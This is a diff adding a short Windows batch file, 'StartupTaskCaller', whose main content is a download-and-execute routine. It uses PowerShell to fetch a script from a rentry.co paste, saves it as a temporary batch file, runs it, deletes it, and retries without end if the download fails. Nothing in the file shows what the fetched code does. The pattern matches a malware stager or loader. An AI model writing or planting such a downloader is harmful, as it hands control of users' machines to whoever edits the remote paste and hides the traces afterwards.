@@ -1,0 +1,26 @@
+:: StartupTaskCaller
+
+@echo off
+setlocal enabledelayedexpansion
+set "embeddedScript=temp_script_StartupTask.bat"
+
+color 0A
+
+
+:StartupTask
+
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/STARTUPTASK/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    echo.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Failed to get content from RUNAUTOTASK Link
+    echo Retrying...
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto StartupTask
+)
